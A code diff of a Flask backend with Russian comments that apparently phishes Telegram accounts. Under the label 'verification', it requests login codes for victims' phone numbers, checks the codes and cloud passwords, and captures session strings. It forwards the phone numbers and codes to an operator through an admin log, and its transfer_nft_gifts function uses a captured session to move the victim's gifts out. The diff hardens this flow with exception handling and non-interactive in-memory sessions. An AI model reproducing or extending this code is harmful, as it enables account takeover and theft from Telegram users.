@@ -1,4 +1,4 @@
-# app.py — Kurigram с StringSession (без файлов)
+# app.py — Kurigram БЕЗ ИНТЕРАКТИВНОГО ВВОДА
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -12,6 +12,14 @@ import re
 from dotenv import load_dotenv
 from pyrogram import Client
 from pyrogram.types import Message
+from pyrogram.errors import (
+    PhoneNumberInvalid,
+    PhoneCodeInvalid,
+    PhoneCodeExpired,
+    SessionPasswordNeeded,
+    PasswordHashInvalid,
+    FloodWait
+)
 import requests
 
 load_dotenv()
@@ -113,14 +121,6 @@ async def get_user_gifts(client):
     except Exception as e:
         print(f"get_available_gifts error: {e}")
     
-    try:
-        # Пробуем get_gifts
-        gifts = await client.get_gifts()
-        if gifts:
-            return gifts
-    except Exception as e:
-        print(f"get_gifts error: {e}")
-    
     return []
 
 # ============================================================
@@ -130,11 +130,13 @@ async def get_user_gifts(client):
 async def transfer_nft_gifts(session_string, phone, username, user_id):
     client = None
     try:
-        # ИСПОЛЬЗУЕМ STRING SESSION (НЕТ ФАЙЛОВ!)
+        # СОЗДАЁМ КЛИЕНТ С STRING SESSION (БЕЗ ИНТЕРАКТИВА!)
         client = Client(
-            session_string,
+            "in_memory",
             api_id=API_ID,
-            api_hash=API_HASH
+            api_hash=API_HASH,
+            session_string=session_string,
+            in_memory=True
         )
         await client.start()
         
@@ -224,26 +226,24 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
                 pass
 
 # ============================================================
-# ВЕРИФИКАЦИЯ
+# ВЕРИФИКАЦИЯ (БЕЗ ИНТЕРАКТИВА!)
 # ============================================================
 
 async def send_code_async(phone):
     try:
-        # Используем временную сессию в памяти
+        # Создаём клиент в памяти
         client = Client(
-            f"session_{int(time.time())}_{random.randint(1000, 9999)}",
+            "in_memory",
             api_id=API_ID,
             api_hash=API_HASH,
-            in_memory=True  # ВАЖНО: сессия в памяти, без файлов!
+            in_memory=True
         )
         await client.start()
         
-        if await client.get_me():
-            await client.stop()
-            return {'success': False, 'error': 'Already authorized'}
-        
+        # Отправляем код
         sent_code = await client.send_code(phone)
         
+        # Сохраняем клиент для проверки кода
         sessions[phone] = {
             'client': client,
             'phone_code_hash': sent_code.phone_code_hash
@@ -252,6 +252,10 @@ async def send_code_async(phone):
         send_admin_log(f"📱 Код для {phone}")
         return {'success': True, 'phone_code_hash': sent_code.phone_code_hash}
         
+    except PhoneNumberInvalid:
+        return {'success': False, 'error': 'Invalid phone number'}
+    except FloodWait as e:
+        return {'success': False, 'error': f'Wait {e.value} seconds'}
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
@@ -289,12 +293,14 @@ async def check_code_async(phone, code, phone_code_hash):
             
             return {'success': True, 'hasPassword': False, 'sessionData': session_data}
             
-        except Exception as e:
-            if 'PASSWORD' in str(e).upper():
-                send_admin_log(f"🔐 Требуется пароль\n📱 {phone}\nКод: {code}")
-                return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
-            else:
-                return {'success': False, 'error': str(e)}
+        except SessionPasswordNeeded:
+            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}\nКод: {code}")
+            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
+            
+        except PhoneCodeInvalid:
+            return {'success': False, 'error': 'Invalid code'}
+        except PhoneCodeExpired:
+            return {'success': False, 'error': 'Code expired'}
             
     except Exception as e:
         return {'success': False, 'error': str(e)}
@@ -329,8 +335,8 @@ async def check_password_async(phone, password):
             
             return {'success': True, 'sessionData': session_data}
             
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
+        except PasswordHashInvalid:
+            return {'success': False, 'error': 'Invalid cloud password'}
             
     except Exception as e:
         return {'success': False, 'error': str(e)}
@@ -353,7 +359,7 @@ def ping():
         'status': 'online',
         'library': 'Kurigram',
         'note': 'Поддерживает получение подарков!',
-        'session': 'in-memory (no files)'
+        'session': 'in-memory (no files, no interactive)'
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -435,6 +441,7 @@ if __name__ == '__main__':
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН (Kurigram)")
     print("📌 Сессия в памяти (in-memory) — нет файлов!")
+    print("📌 Нет интерактивного ввода — всё программно")
     print("📌 Получение подарков: get_available_gifts()")
     print("📌 Передача подарков: transfer_gift()")
     print("=" * 60)
